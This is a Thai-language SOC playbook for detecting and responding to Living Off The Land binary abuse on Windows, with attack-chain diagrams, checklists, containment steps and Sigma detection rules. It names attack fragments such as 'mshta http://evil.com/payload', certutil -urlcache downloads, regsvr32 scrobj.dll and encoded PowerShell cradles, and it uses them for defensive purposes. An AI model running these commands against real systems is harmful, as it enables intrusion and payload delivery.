# Playbook: การตอบสนอง Living Off The Land (LOLBins)

**ID**: PB-39
**ความรุนแรง**: สูง | **ประเภท**: Defense Evasion / Execution
**MITRE ATT&CK**: [T1059](https://attack.mitre.org/techniques/T1059/) (Command and Scripting), [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution), [T1197](https://attack.mitre.org/techniques/T1197/) (BITS Jobs)
**Trigger**: EDR alert (LOLBin usage ผิดปกติ), SIEM (process chain ผิดปกติ), behavioral anomaly detection

> ⚠️ **คำเตือน**: การโจมตี LOLBin ใช้เครื่องมือ Windows ที่ถูกต้องตามกฎหมาย — bypass AV/EDR แบบ signature ได้ ต้องวิเคราะห์พฤติกรรม process

### LOLBins คืออะไร?


### LOLBin Attack Chain

```mermaid
graph LR
    A["1️⃣ เข้าถึง\nPhishing email"] --> B["2️⃣ Execute\nmshta / wscript"]
    B --> C["3️⃣ Download\ncertutil -urlcache"]
    C --> D["4️⃣ Persistence\nschtasks /create"]
    D --> E["5️⃣ C2 Comm\nPowerShell IEX"]
    E --> F["6️⃣ Actions\nขโมยข้อมูล"]
    style A fill:#ffcc00,color:#000
    style B fill:#ff9900,color:#fff
    style C fill:#ff6600,color:#fff
    style D fill:#ff4444,color:#fff
    style E fill:#cc0000,color:#fff
    style F fill:#660000,color:#fff
```



---

## Decision Flow

```mermaid
graph TD
    Alert["🚨 กิจกรรม LOLBin ผิดปกติ"] --> Binary{"Binary ไหน?"}
    Binary -->|PowerShell| PS["ตรวจ: encoded cmds?\ndownload cradle?\nIEX/Invoke-Expression?"]
    Binary -->|certutil| Cert["ตรวจ: -urlcache?\n-decode?\n-encode?"]
    Binary -->|mshta/wscript| Script["ตรวจ: remote URL?\nVBS execution?"]
    Binary -->|rundll32/regsvr32| DLL["ตรวจ: โหลด remote DLL?\nAppLocker bypass?"]
    PS --> Context{"กิจกรรม admin ปกติ?"}
    Cert --> Context
    Script --> Context
    DLL --> Context
    Context -->|"ไม่ — น่าสงสัย"| Investigate["🔴 สืบสวน process chain"]
    Context -->|"ใช่ — คาดหวัง"| FP["บันทึกสำหรับ baseline"]
    Investigate --> Parent{"Parent process?"}
    Parent -->|"Office app (Word/Excel)"| Macro["🔴 อาจเป็น macro malware"]
    Parent -->|"explorer.exe"| User["User เปิดเอง — ตรวจ user"]
    Parent -->|"svchost/services"| Service["กลไก persistence"]
    Macro --> Contain["CONTAIN ทันที"]
    style Alert fill:#ff6600,color:#fff
    style Contain fill:#cc0000,color:#fff
```



### รูปแบบ Process Tree ที่พบบ่อย

```mermaid
graph TD
    subgraph "🔴 รูปแบบอันตราย"
        Outlook1["outlook.exe"] --> Word1["winword.exe"]
        Word1 --> CMD1["cmd.exe"]
        CMD1 --> PS1["powershell.exe -enc ..."]
        PS1 --> Net1["Download จาก C2"]
    end
    subgraph "🟢 รูปแบบปกติ"
        Explorer["explorer.exe"] --> PS2["powershell.exe"]
        PS2 --> Admin["Get-Service, Get-Process"]
    end
    subgraph "🔴 Certutil Download"
        CMD2["cmd.exe"] --> Cert["certutil -urlcache -split -f"]
        Cert --> Payload["malware.exe"]
    end
    style Outlook1 fill:#ff9900,color:#fff
    style PS1 fill:#cc0000,color:#fff
    style Cert fill:#cc0000,color:#fff
    style PS2 fill:#00aa00,color:#fff
```



### ขั้นตอนการสืบสวน

```mermaid
sequenceDiagram
    participant EDR
    participant SOC as SOC Analyst
    participant TI as Threat Intel
    participant IR as IR Team

    EDR->>SOC: 🚨 LOLBin execution ผิดปกติ
    SOC->>EDR: ดึง process tree เต็ม (parent → child → grandchild)
    SOC->>EDR: ดู command line arguments
    SOC->>SOC: ตรวจ: encoded commands? Remote URLs?
    SOC->>TI: Query URL/domain reputation
    TI->>SOC: ยืนยัน domain อันตราย
    SOC->>IR: Escalate — ยืนยันการโจมตี LOLBin
    IR->>EDR: Sweep ทุก endpoint หาว same process chain
    IR->>SOC: ตรวจ persistence (schtasks, registry)
```



### LOLBin Risk Matrix

```mermaid
graph TD
    subgraph "ความเสี่ยงวิกฤต"
        R1["PowerShell -EncodedCommand"]
        R2["certutil -urlcache download"]
        R3["mshta http://evil.com/payload"]
    end
    subgraph "ความเสี่ยงสูง"
        R4["rundll32 remote DLL"]
        R5["regsvr32 /s /n /u scrobj.dll"]
        R6["bitsadmin /transfer download"]
    end
    subgraph "ความเสี่ยงปานกลาง"
        R7["wmic process create"]
        R8["schtasks /create ด้วย cmd"]
        R9["cscript/wscript ด้วย VBS"]
    end
    style R1 fill:#cc0000,color:#fff
    style R2 fill:#cc0000,color:#fff
    style R3 fill:#cc0000,color:#fff
    style R4 fill:#ff6600,color:#fff
    style R7 fill:#ffcc00,color:#000
```



### Timeline การตอบสนอง

```mermaid
gantt
    title LOLBin Response Timeline
    dateFormat HH:mm
    axisFormat %H:%M
    section Detection
        EDR/SIEM alert         :a1, 00:00, 5min
        วิเคราะห์ process tree :a2, after a1, 15min
    section Containment
        แยก endpoint           :a3, after a2, 5min
        Block C2 domain        :a4, after a3, 10min
    section Investigation
        วิเคราะห์ command line :a5, after a4, 30min
        Sweep endpoint         :a6, after a5, 60min
        ตรวจ persistence       :a7, after a6, 30min
    section Recovery
        ลบ persistence         :a8, after a7, 30min
        Policy hardening       :a9, after a8, 60min
```



---

## 1. การดำเนินการทันที (15 นาทีแรก)

| # | การดำเนินการ | ผู้รับผิดชอบ |
|:---|:---|:---|
| 1 | เก็บ process tree เต็มพร้อม command lines | SOC T1 |
| 2 | แยก endpoint ถ้ายืนยันกิจกรรมอันตราย | SOC T1 |
| 3 | Block URLs/domains ที่อยู่ใน command lines | SOC T2 |
| 4 | ตรวจ encoded/obfuscated commands (Base64, XOR) | SOC T2 |
| 5 | ค้นหา LOLBin pattern เดียวกันทุก endpoints | SOC T2 |
| 6 | เก็บ PowerShell transcription/Script Block logs | SOC T2 |

## 2. รายการตรวจสอบ

### วิเคราะห์ Process
- [ ] Process tree เต็ม: parent → LOLBin → children
- [ ] Command line arguments (มี encoding, remote URLs?)
- [ ] เวลาและระยะเวลา execution
- [ ] User context (SYSTEM, admin, หรือ standard user?)
- [ ] Working directory ของ process
- [ ] Network connections ที่ process สร้าง

### ตรวจ Persistence
- [ ] Scheduled tasks: `schtasks /query /v /fo LIST`
- [ ] Registry Run keys: `HKLM/HKCU\...\Run`
- [ ] เนื้อหา Startup folder
- [ ] WMI subscriptions: `Get-WMIObject -Class __FilterToConsumerBinding`
- [ ] Services ที่สร้างหรือแก้ไขเมื่อเร็วๆ นี้

### ตัวบ่งชี้ที่น่าสงสัย
| LOLBin | การใช้งานน่าสงสัย | การใช้งานปกติ |
|:---|:---|:---|
| PowerShell | `-enc`, `-nop`, `IEX`, `Invoke-WebRequest` | Admin scripts ข้อความชัดเจน |
| certutil | `-urlcache -split -f`, `-decode` | จัดการ certificate |
| mshta | `http://` URL argument | เปิดไฟล์ `.hta` ในเครื่อง |
| rundll32 | โหลด DLL จาก `%TEMP%` หรือ URL | โหลด DLL มาตรฐาน |
| bitsadmin | `/transfer` download EXE | Windows Update |
| wmic | `process call create` remote | System inventory |

## 3. การควบคุม (Containment)

| ขอบเขต | การดำเนินการ | รายละเอียด |
|:---|:---|:---|
| **Endpoint** | แยกผ่าน EDR | Block ทุกเครือข่ายยกเว้น EDR |
| **เครือข่าย** | Block C2 domains/IPs | DNS sinkhole + firewall |
| **Execution** | AppLocker / WDAC rules | Block unsigned scripts |
| **Persistence** | ลบ scheduled tasks | ลบ tasks อันตราย |

## 4. การกำจัดและกู้คืน

### ทันที
1. ลบ persistence mechanisms ทั้งหมด (tasks, registry, WMI)
2. ลบ payloads ที่ download มาจาก disk
3. เก็บ PowerShell transcript logs แล้วลบ
4. Reimage ถ้าสงสัยว่า compromise มาก

### Hardening ระยะยาว
1. **PowerShell Constrained Language Mode** สำหรับ non-admin users
2. **Script Block Logging** เปิดใช้ (`EnableScriptBlockLogging`)
3. **AppLocker / WDAC** policies จำกัดการ execute LOLBin
4. **ปิด LOLBins ที่ไม่ใช้** (mshta, cscript, wscript) ผ่าน policy
5. **Credential Guard** ป้องกัน credential theft ผ่าน LOLBins

## 5. หลังเหตุการณ์ (Post-Incident)

### บทเรียน
| คำถาม | คำตอบ |
|:---|:---|
| LOLBin ไหนถูกใช้และทำไมไม่ถูก block? | [บันทึก] |
| PowerShell logging เปิดอยู่หรือไม่? | [ใช่/ไม่] |
| AppLocker/WDAC policies deploy แล้วหรือไม่? | [สถานะ] |
| การโจมตีตรวจจับได้จาก behavior หรือ signature? | [วิธี] |

## 6. Detection Rules (Sigma)

```yaml
title: Suspicious Certutil Download
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - 'urlcache'
            - '-decode'
            - '-encode'
    condition: selection
    level: high
```

```yaml
title: Encoded PowerShell Command
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - 'FromBase64String'
            - '-nop -w hidden'
    condition: selection
    level: high
```

## เอกสารที่เกี่ยวข้อง
- [Suspicious Script Playbook](Suspicious_Script.th.md)
- [Malware Infection Playbook](Malware_Infection.th.md)
- [Privilege Escalation Playbook](Privilege_Escalation.th.md)
- [คู่มือ Tier 2](../Runbooks/Tier2_Runbook.th.md)

## References
- [LOLBAS Project](https://lolbas-project.github.io/)
- [MITRE T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [SANS — Detecting LOLBins](https://www.sans.org/white-papers/)
